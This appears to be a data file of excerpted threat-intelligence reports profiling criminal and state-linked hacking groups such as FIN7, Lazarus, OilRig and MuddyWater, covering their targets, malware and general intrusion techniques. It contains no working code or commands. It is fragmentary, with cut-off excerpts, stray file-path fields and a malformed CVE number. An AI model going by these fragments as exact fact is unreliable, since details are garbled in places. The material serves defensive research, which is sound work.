(FireEye) FireEye tracks a threat group that we call ""FIN4,"" whose intrusions seem to have a different objective: to obtain an edge in stock trading. FIN4 appears to conduct intrusions that are focused on a single objective: obtaining access to insider information capable of making or breaking the stock prices of public companies. The group specifically targets the emails of C-level executives, legal counsel, regulatory, risk, and compliance personnel, and other individuals who would regularly discuss confidential, market-moving information. FIN4 has targeted over 100 companies since at least mid-2013. All of the targeted organizations are either public companies or advisory firms that provide services to public companies (such as investor relations, legal, and investment banking firms). Over two-thirds of the targeted organizations are healthcare and pharmaceutical companies. FIN4 probably focuses on these types of organizations because their stocks can move dramatically in response to news of clinical trial results, regulatory decisions, or safety and legal issues.

Description

FIN5 is a financially motivated threat group that has targeted personally identifiable information and payment card information. The group has been active since at least 2008 and has targeted the restaurant, gaming, and hotel industries. The group is made up of actors who likely speak Russian. (DarkReading) No 0days. No spear-phishing, either: The cybercriminal group tied to numerous payment card breaches including Goodwill and best known by its socalled ""RawPOS"" malware employed legitimate user credentials to access its targets' networks. Researchers at FireEye here today shared their recent findings on this prolific and long-running cybercrime gang that has been the subject of multiple Visa security alerts to merchants. The RawPOS memory scraper malware has been infecting the lodging industry in epidemic proportions over the past year, and is considered one of the first memory scrapers to target point-of-sale systems. FireEye has dubbed the cybercrime gang FIN5. ""One of the most unique things about FIN5 is that in every intrusion we responded to where FIN5 has been active, legitimate access was identified. They had valid user credentials to remotely log into the network,"" said Barry Vengerik, principal threat analyst at FireEye. ""No sexy zero-days, no remote exploits -- not even spear-phishing. They had credentials from somewhere."""|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|6aed21cb06b149faafcc1e94fc83ae86
"FIN5, which earlier this year was profiled by researchers at Trend Micro and has been in action since at least 2008, uses real credentials from the victim organization's virtual private network, Remote Desktop Protocol, Citrix, or VNC. Vengerik says the attackers got those credentials via third parties associated with the victims' POS systems.

FIN7 is a financially-motivated threat group that has primarily targeted the U.S. retail, restaurant, and hospitality sectors since mid-2015. They often use point-ofsale malware. A portion of FIN7 was run out of a front company called Combi Security. FIN7 is sometimes referred to as Carbanak, Anunak, but these appear to be two groups using the same Carbanak malware and are therefore tracked separately. The reports about arrests made of the mastermind of Carbanak, Anunak instead of FIN7. However, security research teams keep referring to this arrest for all FIN7 activities since.

(FireEye) We attribute the use of this EoP to a financially motivated threat actor. In the past year, not only have we observed this group using similar infrastructure and tactics, techniques, and procedures (TTPs), but they are also the only group we have observed to date who uses the downloader PUNCHBUGGY and POS malware PUNCHTRACK. Designed to scrape both Track 1 and Track 2 payment card data, PUNCHTRACK is loaded and executed by a highly obfuscated launcher and is never saved to disk. This actor has conducted operations on a large scale and at a rapid pace, displaying a level of operational awareness and ability to adapt their operations on the fly. These abilities, combined with targeted usage of an EoP exploit and the reconnaissance required to individually tailor phishing emails to victims, potentially speaks to the threat actors’ operational maturity and sophistication. FireEye identified more than 100 organizations in North America that fell victim to this campaign.

(FireEye) FireEye has observed multiple targeted intrusions occurring in North America — predominately in Canada — dating back to at least 2013 and continuing through at least 2016, in which the attacker(s) have compromised organizations’ networks and sought to monetize this illicit access by exfiltrating sensitive data and extorting victim organizations. In some cases, when the extortion demand was not met, the attacker(s) destroyed production Windows systems by deleting critical operating system files and then shutting down the impacted systems. Based on near parallel TTPs used by the attacker(s) across these targeted intrusions, we believe these clusters of activity are linked to a single, previously unobserved actor or group that we have dubbed FIN10.

(Lookingglass) The Lookingglass Cyber Threat Intelligence Group (CTIG) has been tracking an ongoing cyber espionage campaign named “Operation Armageddon”. The name was derived from multiple Microsoft Word documents used in the attacks. “Armagedon” (spelled incorrectly) was found in the “Last Saved By” and “Author” fields in multiple Microsoft Word documents. Although continuously developed, the campaign has been intermittently active at a small scale, and uses unsophisticated techniques. The attack timing suggests the campaign initially started due to Ukraine’s decision to accept the Ukraine--‐European Union Association Agreement (AA). The agreement was designed to improve economic integrations between Ukraine and the European Union. Russian leaders publicly stated that they believed this move by Ukraine directly threatened Russia’s national security. Although initial steps to join the Association occurred in March 2012, the campaign didn’t start until much later (mid‐2013), as Ukraine and the EU started to more actively move towards the agreement. Russian actors began preparing for attacks in case Ukraine finalized the AA. The earliest identified modification timestamp of malware used in this campaign is June 26, 2013."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|c1fc73114fa24dc691ec86075cadbe3b

Financial gain

Description

(Kaspersky) A second group, which we call GCMAN because the malware is based on code compiled on the GCC compiler, emerged recently using similar techniques to the Corkow, Metel Group to infect banking institutions and attempt to transfer money to e-currency services. The initial infection mechanism is handled by spear-phishing financial institution targets with e-mails carrying a malicious RAR archive to. Upon opening the RAR archive, an executable is started instead of a Microsoft Word document, resulting in infection. Once inside the network, the GCMAN group uses legitimate and penetration testing tools such as Putty, VNC, and Meterpreter for lateral movement. Our investigation revealed an attack where the group then planted a cron script into bank’s server, sending financial transactions at the rate of $200 per minute. A time-based scheduler was invoking the script every minute to post new transactions directly to upstream payment processing system. This allowed the group to transfer money to multiple e-currency services without these transactions being reported to any system inside the bank.

Information theft and espionage

Description

(Information Warfare Monitor) Cyber espionage is an issue whose time has come. In this second report from the Information Warfare Monitor, we lay out the findings of a 10-month investigation of alleged Chinese cyber spying against Tibetan institutions. The investigation, consisting of fieldwork, technical scouting, and laboratory analysis, discovered a lot more. The investigation ultimately uncovered a network of over 1,295 infected hosts in 103 countries. Up to 30% of the infected hosts are considered high-value targets and include computers located at ministries of foreign affairs, embassies, international organizations, news media, and NGOs. The Tibetan computer systems we manually investigated, and from which our investigations began, were conclusively compromised by multiple infections that gave attackers unprecedented access to potentially sensitive information. (UCAM) Attacks on the Dalai Lama’s Private Office The OHHDL started to suspect it was under surveillance while setting up meetings be-tween His Holiness and foreign dignitaries. They sent an email invitation on behalf of His Holiness to a foreign diplomat, but before they could follow it up with a courtesy telephone call, the diplomat’s office was contacted by the Chinese government and warned not to go ahead with the meeting. The Tibetans wondered whether a computer compromise might be the explanation; they called ONI Asia who called us."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|6ca542ad767c4131b494177ab39f743f

(360) On March 17, 2019, 360 Threat Intelligence Center captured a target attack sample against the Middle East by exploiting WinRAR vulnerability (CVE-201820250), and it seems that the attack is carried out by the Goldmouse APT group (APT-C-27). There is a decoy Word document inside the archive regarding terrorist attacks to lure the victim into decompressing. When the archive gets decompressed on the vulnerable computer, the embedded njRAT backdoor (Telegram Desktop.exe) will be extracted to the startup folder and then triggered into execution if the victim restarts the computer or performs re-login. After that, the attacker is capable to control the compromised device.

Small wave of phishing emails targeting a US-based government organization. Within the 43 emails we observed, we found that three unique files were delivered, which consisted of two RTFs and a Microsoft Excel file. Both RTFs exploited CVE-2012-0158 and acted as downloaders to ultimately deliver the QuasarRAT malware family. The downloaders made use of the same shellcode, with minor variances witnessed between them. Additionally, the RTFs made use of heavy obfuscation within the documents themselves, making it more difficult to extract the embedded shellcode. <https://unit42.paloaltonetworks.com/unit42-tracking-subaat-targetedphishing-attacks-point-leader-threat-actors-repository/>

Description

(IBM) IBM X-Force Research uncovered a Trojan hybrid spawned from the Nymaim and Gozi ISFB malware. It appears that the operators of Nymaim have recompiled its source code with part of the Gozi ISFB source code, creating a combination that is being actively used in attacks against more than 24 U.S. and Canadian banks, stealing millions of dollars so far. X-Force named this new hybrid GozNym. The new GozNym hybrid takes the best of both the Nymaim and Gozi ISFB malware to create a powerful Trojan. From the Nymaim malware, it leverages the dropper’s stealth and persistence; the Gozi ISFB parts add the banking Trojan’s capabilities to facilitate fraud via infected Internet browsers. The end result is a new banking Trojan in the wild.

Description

(SecurityWeek) A threat actor using Iranian-language tools, Iranian hosting companies, operating from the Iranian IP space at times was observed targeting the Syrian opposition in an elaborately staged malware operation, Citizen Lab researchers reveal. The operation was first noticed in late 2015, when a member of the Syrian opposition flagged a suspicious email containing a PowerPoint slideshow, which led researchers to a watering hole website with malicious programs, malicious PowerPoint files, and Android malware. The threat actor was targeting Windows and Android devices of well-connected individuals in the Syrian opposition, researchers discovered. They called the actor Group5, because it targets Syrian opposition after regime-linked malware groups, the Syrian Electronic Army, ISIS (also known as the Islamic State or ISIL), and a group linked to Lebanon did the same in the past.

Description

(Symantec) The Hidden Lynx group has been in operation since at least 2009 and is most likely a professional organization that offers a “hackers for hire” service. They have the capability to attack many organizations with concurrently running campaigns. They operate efficiently and move quickly and methodically. Based on these factors, the Hidden Lynx group would need to be a sizeable organization made up of between 50 and 100 individuals. Much of the attack infrastructure and tools used during these campaigns originate from network infrastructure in China. The Hidden Lynx group makes regular use of zero-day exploits and has the ability to rework and customize exploits quickly. They are methodical in their approach and they display a skillset far in advance of some other attack groups also operating in that region, such as the Comment Crew (also known as APT1). The Hidden Lynx group is an advanced persistent threat that has been in operation for at least four years and is breaking into some of the bestprotected organizations in the world. With a zero-day attack already under their belt in 2013, they continue to operate at the leading edge of targeted attacks. This group appears to be closely associated with APT 17, Deputy Dog.

Description

(CrowdStrike) We have investigated their intrusions since 2013 and have been battling them nonstop over the last year at several large telecommunications and technology companies. The determination of this China-based adversary is truly impressive: they are like a dog with a bone. Hurricane Panda’s preferred initial vector of compromise and persistence is a China Chopper webshell – a tiny and easily obfuscated 70 byte text file that consists of an ‘eval()’ command, which is then used to provide full command execution and file upload/download capabilities to the attackers. This script is typically uploaded to a web server via a SQL injection or WebDAV vulnerability, which is often trivial to uncover in a company with a large external web presence. Once inside, the adversary immediately moves on to execution of a credential theft tool such as Mimikatz (repacked to avoid AV detection). If they are lucky to have caught an administrator who might be logged into that web server at the time, they will have gained domain administrator credentials and can now roam your network at will via ‘net use’ and ‘wmic’ commands executed through the webshell terminal.

Russia

Motivation

Information theft and espionage

Description

(Symantec) Researchers from Blue Coat Labs have identified the emergence of a previously undocumented attack framework that is being used to launch highly targeted attacks in order to gain access to, and extract confidential information from, victims’ computers. Because of the many layers used in the design of the malware, we’ve named it Inception—a reference to the 2010 movie “Inception” about a thief who entered peoples’ dreams and stole secrets from their subconscious.

Description

Since early 2013, we have observed activity from a unique threat actor group, which we began to investigate based on increased activities against human right activists in the beginning of 2015. In line5with other research on the campaign, released prior to publication of this document, we have adopted the name “Infy”, which is based on labels used in the infrastructure and its two families of malware agents. Thanks to information we have been able to collect during the course of our research, such as characteristics of the group’s malware and development cycle, our research strongly supports the claim that the Infy group is of Iranian origin and potentially connected to the Iranian state. Amongst a backdrop of other incidents, Infy became one of the most frequently observed agents for attempted malware attacks against Iranian civil society beginning in late 2014, growing in use up to the February 2016 parliamentary election in Iran. After the conclusion of the parliamentary election, the rate of attempted intrusions and new compromises through the Infy agent slowed, but did not end. The trends witnessed in reports from recipients are reinforced through telemetry provided by design failures in more recent versions of the Infy malware.

Information theft and espionage

Description

(Kaspersky) Iridium is an APT that uses proprietary techniques to bypass two-factor authentication for critical applications, according to security firm Resecurity. A researcher has attributed a recently publicized attack on Citrix’ internal network to the Iranian-linked group known as Iridium – and said that the data heist involved 6 terabytes of sensitive data. The culprit is an APT that uses proprietary techniques to bypass two-factor authentication for critical applications and services for further unauthorized access to virtual private networks and single sign-on systems, according to Resecurity. “[Iridium] has hit more than 200 government agencies, oil and gas companies and technology companies, including Citrix Systems Inc.,” they said. Threatpost has reached out for further details as to how the firm is linking the APT to the attack and will update this post accordingly.

Operation “Ke3chang” As the crisis in Syria escalates, FireEye research-ers have discovered a cyber espionage campaign, which we call “Ke3chang,” that falsely advertises information updates about the ongoing crisis to compromise MFA networks in Europe. We believe that the Ke3chang attackers are operating out of China and have been active since at least 2010. However, we believe specific Syria-themed attacks against MFAs (codenamed by Ke3chang as “moviestar”) began only in August 2013. The timing of the attacks precedes a G20 meeting held in Russia that focused on the crisis in Syria. <https://www.fireeye.com/content/dam/fireeye-www/global/en/currentthreats/pdfs/wp-operation-ke3chang.pdf>

Little has been published on the threat actors responsible for Operation Ke3chang since the report was released more than two years ago. However, Unit 42 has recently discovered the actors have continued to evolve their custom malware arsenal. We’ve discovered a new malware family we’ve named TidePool. It has strong behavioral ties to Ke3chang and is being used in an ongoing attack campaign against Indian embassy personnel worldwide. This targeting is also consistent with previous attacker TTPs; Ke3chang historically targeted the Ministry of Affairs, and also conducted several prior campaigns against India. <https://unit42.paloaltonetworks.com/operation-ke3chang-resurfaceswith-new-tidepool-malware/>

It all started one day when we encountered a somewhat unsophisticated spy program that communicated with its “master” via a public e-mail server. This approach is rather inherent to many amateur virus-writers and these malware attacks are mostly ignored.

Information theft, espionage, disruption, sabotage and financial gain

Description

(Malwarebytes) Lazarus Group is commonly believed to be run by the North Korean government, motivated primarily by financial gain as a method of circumventing long-standing sanctions against the regime. They first came to substantial media notice in 2013 with a series of coordinated attacks against an assortment of South Korean broadcasters and financial institutions using DarkSeoul, a wiper program that overwrites sections of the victims’ master boot record. In November 2014, a large scale breach of Sony Pictures was attributed to Lazarus. The attack was notable due to its substantial penetration across Sony networks, the extensive amount of data exfiltrated and leaked, as well of use of a wiper in a possible attempt to erase forensic evidence. Attribution on the attacks was largely hazy, but the FBI released a statement tying the Sony breach to the earlier DarkSeoul attack, and officially attributed both incidents to North Korea. Fast forward to May 2017 with the widespread outbreak of WannaCry, a piece of ransomware that used an SMB exploit as an attack vector. Attribution to North Korea rested largely on code reuse between WannaCry and previous North Korean attacks, but this was considered to be thin grounds given the common practice of tool sharing between regional threat groups."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|2a0d10f017834e138afbd61265fea7aa
"Western intelligence agencies released official statements to the public reaffirming the attribution, and on September 6, 2018, the US Department of Justice charged a North Korean national with involvement in both WannaCry and the Sony breach.

Duuzer backdoor Trojan targets South Korea to take over computers Symantec has found that South Korea is being impacted by an active back door Trojan, detected as Backdoor.Duuzer. While the malware attack has not been exclusively targeting the region, it has been focusing on the South Korean manufacturing industry. Duuzer is a well-designed threat that gives attackers remote access to the compromised computer, downloads additional files, and steals data. It’s clearly the work of skilled attackers looking to obtain valuable information. <https://www.symantec.com/connect/blogs/duuzer-back-door-trojantargets-south-korea-take-over-computers>

During these intrusions, Lead’s objective was to steal sensitive data, including research materials, process documents, and project plans. Lead also steals code-signing certificates to sign its malware in subsequent attacks. In most cases, Lead’s attacks do not feature any advanced exploit techniques. The group also does not make special effort to cultivate victims prior to an attack. Instead, the group often simply emails a Winnti installer to potential victims, relying on basic social engineering tactics to convince recipients to run the attached malware. In some other cases, Lead gains access to a target by bruteforcing remote access login credentials, performing SQL injection, or exploiting unpatched web servers, and then they copy the Winnti installer directly to compromised machines.

(Symantec) Symantec has uncovered the operations of a threat actor named Leafminer that is targeting a broad list of government organizations and business verticals in various regions in the Middle East since at least early 2017. The group tends to adapt publicly available techniques and tools for their attacks and experiments with published proof-of-concept exploits. Leafminer attempts to infiltrate target networks through various means of intrusion: watering hole websites, vulnerability scans of network services on the internet, and bruteforce/dictionary login attempts. The actor’s post-compromise toolkit suggests that the group is looking for email data, files, and database servers on compromised target systems. (Dragos) Analysis of Raspite tactics, techniques, and procedures (TTPs) indicate the group has been active in some form since early- to mid-2017. Raspite targeting includes entities in the US, Middle East, Europe, and East Asia. Operations against electric utility organizations appear limited to the US at this time. Raspite leverages strategic website compromise to gain initial access to target networks. Raspite uses the same methodology as Berserk Bear, Dragonfly 2.0 and Allanite in embedding a link to a resource to prompt an SMB connection, from which it harvests Windows credentials. The group then deploys install scripts for a malicious service to beacon back to Raspite -controlled infrastructure, allowing the adversary to remotely access the victim machine.|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|db06864c187f4e049d93dcf719c829af

(FireEye) FireEye is highlighting a cyber espionage operation targeting crucial technologies and traditional intelligence targets from a China-nexus state sponsored actor we call APT40. The actor has conducted operations since at least 2013 in support of China’s naval modernization effort. The group has specifically targeted engineering, transportation, and the defense industry, especially where these sectors overlap with maritime technologies. More recently, we have also observed specific targeting of countries strategically important to the Belt and Road Initiative including Cambodia, Belgium, Germany, Hong Kong, Philippines, Malaysia, Norway, Saudi Arabia, Switzerland, the United States, and the United Kingdom. This China-nexus cyber espionage group was previously reported as TEMP.Periscope and TEMP.Jumper.

Some operations and tooling used by this group were exposed in the [Vault 7/8] leaks on WikiLeaks in 2017. (Symantec) Longhorn has been active since at least 2011. It has used a range of back door Trojans in addition to zero-day vulnerabilities to compromise its targets. Longhorn has infiltrated governments and internationally operating organizations, in addition to targets in the financial, telecoms, energy, aerospace, information technology, education, and natural resources sectors. All of the organizations targeted would be of interest to a nation-state attacker. Longhorn has infected 40 targets in at least 16 countries across the Middle East, Europe, Asia, and Africa. On one occasion a computer in the United States was compromised but, following infection, an uninstaller was launched within hours, which may indicate this victim was infected unintentionally. Longhorn’s malware appears to be specifically built for espionage-type operations, with detailed system fingerprinting, discovery, and exfiltration capabilities. The malware uses a high degree of operational security, communicating externally at only select times, with upload limits on exfiltrated data, and randomization of communication intervals—all attempts to stay under the radar during intrusions.

Information theft and espionage

Description

(Symantec) A series of attacks, targeting both Indian military research and south Asian shipping organizations, demonstrate the minimum level of effort required to successfully compromise a target and steal sensitive information. The attackers use very simple malware, which required little development time or skills, in conjunction with freely available Web hosting, to implement a highly effective attack. It is a case of the attackers obtaining a maximum return on their investment. The attack shows how an intelligent attacker does not need to be particularly technically skilled in order to steal the information they are after. The attack begins, as is often the case, with an email sent to the victim. A malicious document is attached to the email, which, when loaded, activates the malware. The attackers use tailored emails to encourage the victim to open the email. For example, one email sent to an academic claimed to be a call for papers for a conference (CFP). The vast majority of the victims were based in India, with some in Malaysia. The victim industry was mostly military research and also shipping based in the Arabian and South China seas. In some instances the attackers appeared to have a clear goal, whereby specific files were retrieved from certain compromised computers. In other cases, the attackers used more of a ‘shotgun’ like approach, copying every file from a computer."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|fc2d4a043f1b4817ba6ec9937945212e
"Military technologies were obviously the focus of one particular attack with what appeared to be source code stolen. 45 different attacker IP addresses were observed. Out of those, 43 were within the same IP address range based in Sichuan province, China. The remaining two were based in South Korea. The pattern of attacker connections implies that the IP addresses are being used as a VPN, probably in an attempt to render the attackers anonymous. The attacks have been active from at least April 2011 up to February 2012. The attackers are intelligent and focused, employing the minimum amount of work necessary for the maximum gain. They do not use zero day exploits or complicated threats, instead they rely on effective social engineering and lax security measures on the part of the victims.

Description

(Kaspersky) When we first encountered Lurk, in 2011, it was a nameless Trojan. It all started when we became aware of a number of incidents at several Russian banks that had resulted in the theft of large sums of money from customers. To steal the money, the unknown criminals used a hidden malicious program that was able to interact automatically with the financial institution’s remote banking service (RBS) software; replacing bank details in payment orders generated by an accountant at the attacked organization, or even generating such orders by itself. In 2016, it is hard to imagine banking software that does not demand some form of additional authentication, but things were different back in 2011. In most cases, the attackers only had to infect the computer on which the RBS software was installed in order to start stealing the cash. Russia’s banking system, like those of many other countries, was unprepared for such attacks, and cybercriminals were quick to exploit the security gap. So we decided to take a closer look at the malware. The first attempts to understand how the program worked gave our analysts nothing. Regardless of whether it was launched on a virtual or a real machine, it behaved in the same way: it didn’t do anything. This is how the program, and later the group behind it, got its name. To “lurk” means to hide, generally with the intention of ambush. We were soon able to help investigate another incident involving Lurk."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|212bf1450b6841319e220690ce5d4dbb
"This time we got a chance to explore the image of the attacked computer. There, in addition to the familiar malicious program, we found a .dll file with which the main executable file could interact. This was our first piece of evidence that Lurk had a modular structure. Later discoveries suggest that, in 2011, Lurk was still at an early stage of development. It was formed of just two components, a number that would grow considerably over the coming years.

According to the Treasury Department, since 2013, the Mabna Institute hit 144 US universities and 176 universities in 21 foreign countries. Geoffrey Berman, US Attorney for the Southern District of New York revealed that the spear phishing campaign targeted more than 100,000 university professors worldwide and about 8,000 accounts were compromised. The Iranian hackers exfiltrated 31 terabytes, roughly 15 billion pages of academic projects were stolen. The hackers also targeted the US Department of Labor, the US Federal Energy Regulatory Commission, and many private and non-governmental organizations. The sanctions also hit the Mabna Institute, an Iran-based company that had a critical role in coordinating the attacks on behalf of Iran’s Revolutionary Guards.

Operation “Cobalt Dickens” Despite indictments in March 2018, the Iranian threat group is likely responsible for a large-scale campaign that targeted university credentials using the same spoofing tactics as previous attacks. In August 2018, members of university communities worldwide may have been providing access to more than just homework assignments. Secureworks Counter Threat Unit (CTU) researchers discovered a URL spoofing a login page for a university. Further research into the IP address hosting the spoofed page revealed a broader campaign to steal credentials. Sixteen domains contained over 300 spoofed websites and login pages for 76 universities located in 14 countries, including Australia, Canada, China, Israel, Japan, Switzerland, Turkey, the United Kingdom, and the United States. <https://www.secureworks.com/blog/back-to-school-cobalt-dickenstargets-universities>

Kaspersky Lab and Seculert identified more than 800 victims located in Iran, Israel and select countries across the globe connecting to the C&Cs over the past eight months. Statistics from the sinkhole revealed that the victims were primarily business people working on Iranian and Israeli critical infrastructure projects, Israeli financial institutions, Middle Eastern engineering students, and various government agencies communicating in the Middle East. Common applications and websites that were spied on include accounts on Gmail, Hotmail, Yahoo! Mail, ICQ, Skype, Google+, and Facebook. Surveillance is also performed over integrated ERP/CRM systems, business contracts, and financial management systems.

Description

(Dragos) Covellite compromises networks associated with civilian electric energy worldwide and gathers intelligence on intellectual property and internal industrial operations. Covellite lacks an industrial control system (ICS) specific capability at this time.

Covellite operates globally with targets primarily in Europe, East Asia, and North America. US targets emerged in September 2017 with a small, targeted phishing campaign directed at select U.S. electric companies. The phishing emails contain a malicious Microsoft Word document and infected computers with malware.

The malicious emails discovered in the fall masqueraded as resumes or invitation They delivered a remote access tool (RAT) payload which was used to conduct reconnaissance and enable persistent, covert access to victims’ machines.

Covellite’s infrastructure and malware are similar to the hacking organization know as Lazarus Group, Hidden Cobra, Labyrinth Chollima by Novetta and Hidden Cob by the U.S. Department of Homeland Security.

Lazarus Group is responsible for attacks ranging from the 2014 attack on Sony Pictures to a number of Bitcoin heists in 2017. Technical analysis of Covellite malware indicates an evolution from known Lazarus toolkits. However, aside from technical overlap, it is not known how the capabilities and operations between Covellite and Lazarus are related."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|8279c121100b4c8eb2151fa5c3f41287

This is most clearly the case in a campaign focusing on government and critical infrastructure of Myanmar that is described in this report. Chances are about even, though, that Mofang is a relevant threat actor to any organization that invests in Myanmar or is otherwise politically involved.

Description

(Group-IB) In less than two years, this group has conducted over 20 successful attacks on financial institutions and legal firms in the USA, UK and Russia. The group has primarily been targeting card processing systems, including the AWS CBR (Russian Interbank System) and purportedly SWIFT (US). Given the wide usage of STAR in LATAM, financial institutions in LATAM could have particular exposure to a potential interest from the MoneyTaker group. Although the group has been successful at targeting a number of banks in different countries, to date, they have gone unreported. In addition to banks, the MoneyTaker group has attacked law firms and also financial software vendors. In total, Group-IB has confirmed 20 companies as MoneyTaker victims, with 16 attacks on US organizations, 3 attacks on Russian banks and 1 in the UK.

Description

(Reaqta) MuddyWater is an APT group that has been active throughout 2017, targeting victims in Middle East with in-memory vectors leveraging on Powershell, in a family of attacks now identified as “Living off the land”, as they don’t require the creation of new binaries on the victim’s machine, thus maintaining a low detection profile and a low forensic footprint. The operators behind MuddyWater are likely espionage motivated, we derive this information from the analysis of data and backdoors behaviors. We also find that despite the strong preponderance of victims from Pakistan, the most active targets appear to be in: Saudi Arabia, UAE and Iraq. Amongst the victims we identify a variety of entities with a stronger focus at Governments, Telcos and Oil companies. By tracking the operations we finally figure out that the originating country is likely to be Iran, while it remains harder to ascertain whether MuddyWater is state sponsored or a criminal organization incline to espionage.

We discovered a new campaign targeting organizations in Turkey, Pakistan and Tajikistan that has some similarities with an earlier campaign named MuddyWater, which hit various industries in several countries, primarily in the Middle East and Central Asia. <https://blog.trendmicro.com/trendlabs-security-intelligence/campaignpossibly-connected-muddywater-surfaces-middle-east-central-asia/> May 2018

Another Potential MuddyWater Campaign uses Powershell-based PRB-Backdoor In May 2018, we found a new sample (Detected as W2KM_DLOADR.UHAOEEN) that may be related to this campaign. Like the previous campaigns, these samples again involve a Microsoft Word document embedded with a malicious macro that is capable of executing PowerShell (PS) scripts leading to a backdoor payload. One notable difference in the analyzed samples is that they do not directly download the Visual Basic Script(VBS) and PowerShell component files, and instead encode all the scripts on the document itself. The scripts will then be decoded and dropped to execute the payload without needing to download the component files. <https://blog.trendmicro.com/trendlabs-security-intelligence/anotherpotential-muddywater-campaign-uses-powershell-based-prbbackdoor/>

Description

(CrowdStrike) In April 2017, CrowdStrike Falcon Intelligence observed a previously unattributed actor group with a Chinese nexus targeting a U.S.-based think tank. Further analysis revealed a wider campaign with unique tactics, techniques, and procedures (TTPs). This adversary targets non-governmental organizations (NGOs) in general, but uses Mongolian language decoys and themes, suggesting this actor has a specific focus on gathering intelligence on Mongolia. These campaigns involve the use of shared malware like Poison Ivy or PlugX. Recently, Falcon Intelligence observed new activity from Mustang Panda, using a unique infection chain to target likely Mongolia-based victims. This newly observed activity uses a series of redirections and fileless, malicious implementations of legitimate tools to gain access to the targeted systems. Additionally, Mustang Panda actors reused previously-observed legitimate domains to host files.

BKDR_RARSTONE RAT Last year, we reported about PlugX a breed of Remote Access Trojan (RAT) used in certain high-profile APT campaigns. We also noted some of its noteworthy techniques, which include its capability to hide its malicious codes by decrypting and loading a backdoor “executable file” directly into memory, without the need to drop the actual “executable file”. Recently, we uncovered a RAT using the same technique. The new sample detected by Trend Micro as BKDR_RARSTONE.A is similar (but not) PlugX, as it directly loads a backdoor “file” in memory without dropping any “file”. However, as we proceeded with our analysis, we found that BKDR_RARSTONE has some tricks of its own. <https://blog.trendmicro.com/trendlabs-securityintelligence/bkdr_rarstone-new-rat-to-watch-out-for/>

Neodymium is an activity group that conducted a campaign in May 2016 and has heavily targeted Turkish victims. The group has demonstrated similarity to another activity group called Promethium due to overlapping victim and campaign characteristics. Neodymium is reportedly associated closely with BlackOasis operations, but evidence that the group names are aliases has not been identified. (Microsoft) Neodymium is an activity group that is known to use a backdoor malware detected by Microsoft as Wingbird. This backdoor’s characteristics closely match FinFisher, a government-grade commercial surveillance package. Data about Wingbird activity indicate that it is typically used to attack individual computers instead of networks.

(McAfee) Starting in November 2009, coordinated covert and targeted cyberattacks have been conducted against global oil, energy, and petrochemical companies. These attacks have involved social engineering, spear-phishing attacks, exploitation of Microsoft Windows operating systems vulnerabilities, Microsoft Active Directory compromises, and the use of remote administration tools (RATs) in targeting and harvesting sensitive competitive proprietary operations and projectfinancing information with regard to oil and gas field bids and operations. Attackers using several locations in China have leveraged C&C servers on purchased hosted services in the United States and compromised servers in the Netherlands to wage attacks against global oil, gas, and petrochemical companies, as well as individuals and executives in Kazakhstan, Taiwan, Greece, and the United States to acquire proprietary and highly confidential information. The primary operational technique used by the attackers comprised a variety of hacker tools, including privately developed and customized RAT tools that provided complete remote administration capabilities to the attacker. RATs provide functions similar to Citrix or Microsoft Windows Terminal Services, allowing a remote individual to completely control the affected system."|data_input/Oilrig_reports/entry_305d75b6-95b2-468b-9124-c5a5a8f93f4b.text|274242bcd0794e02bc556140535d8ad9
"To deploy these tools, attackers first compromised perimeter security controls, through SQL-injection exploits of extranet web servers, as well as targeted spear-phishing attacks of mobile worker laptops, and compromising corporate VPN accounts to penetrate the targeted company’s defensive architectures (DMZs and firewalls) and conduct reconnaissance of targeted companies’ networked computers.

From late April to early May, the attackers focused on human rights related NGOs. They then moved on to the motor industry in late May. From June until mid-July no activity was detected. At this point, the current attack campaign against the chemical industry began. This particular attack has lasted much longer than previous attacks, spanning two and a half months. A total of 29 companies in the chemical sector were confirmed to be targeted in this attack wave and another 19 in various other sectors, primarily the defense sector, were seen to be affected as well. These 48 companies are the minimum number of companies targeted and likely other companies were also targeted. In a recent two week period, 101 unique IP addresses contacted a command and control server with traffic consistent with an infected machine. These IPs represented 52 different unique Internet Service Providers or organizations in 20 countries.

Description

OilRig is a threat group with suspected Iranian origins that has targeted Middle Eastern and international victims since at least 2014. The group has targeted a variety of industries, including financial, government, energy, chemical, and telecommunications, and has largely focused its operations within the Middle East. It appears the group carries out supply chain attacks, leveraging the trust relationship between organizations to attack their primary targets. FireEye assesses that the group works on behalf of the Iranian government based on infrastructure details that contain references to Iran, use of Iranian infrastructure, and targeting that aligns with nation-state interests. This group was previously tracked under two distinct groups, APT 34 and OilRig, but was combined due to additional reporting giving higher confidence about the overlap of the activity. OilRig seems to be closely related to APT 33, Elfin.

Shamoon Attacks W32.Disttrack is a new threat that is being used in specific targeted attacks against at least one organization in the energy sector. It is a destructive malware that corrupts files on a compromised computer and overwrites the MBR (Master Boot Record) in an effort to render a computer unusable. Target: Saudi Aramco and Rasgas. <https://www.symantec.com/connect/blogs/shamoon-attacks>

Targeted Attacks against Banks in the Middle East In the first week of May 2016, FireEye’s DTI identified a wave of emails containing malicious attachments being sent to multiple banks in the Middle East region. The threat actors appear to be performing initial reconnaissance against would-be targets, and the attacks caught our attention since they were using unique scripts not commonly seen in crimeware campaigns. <https://www.fireeye.com/blog/threatresearch/2016/05/targeted_attacksaga.html> <https://unit42.paloaltonetworks.com/the-oilrig-campaign-attacks-onsaudi-arabian-organizations-deliver-helminth-backdoor/>

Shamoon v2 The malware used in the recent attacks (W32.Disttrack.B) is largely unchanged from the variant used four years ago. In the 2012 attacks, infected computers had their master boot records wiped and replaced with an image of a burning US flag.

We have identified two separate testing efforts carried out by the OilRig actors, one occurring in June and one in November of 2016. The sample set associated with each of these testing activities is rather small, but the changes made to each of the files give us a chance to understand what modifications the actor performs in an attempt to evade detection. This testing activity also suggests that the threat group responsible for the OilRig attack campaign have an organized, professional operations model that includes a testing component to the development of their tools. <https://unit42.paloaltonetworks.com/unit42-oilrig-actors-provideglimpse-development-testing-efforts/>

Description

